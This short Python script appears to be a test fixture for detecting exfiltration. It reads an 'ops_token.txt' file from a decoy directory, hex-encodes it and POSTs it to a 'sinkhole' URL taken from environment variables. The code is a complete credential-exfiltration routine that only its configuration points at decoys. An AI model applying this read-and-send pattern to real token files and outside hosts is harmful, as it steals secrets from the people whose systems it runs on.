import os
from pathlib import Path
from urllib.request import Request, urlopen


raw = (Path(os.environ["AEGIS_DECOY_DIR"]) / "ops_token.txt").read_bytes()
request = Request(os.environ["AEGIS_SINKHOLE_URL"], data=raw.hex().encode("ascii"), method="POST")
with urlopen(request, timeout=2) as response:
    response.read()
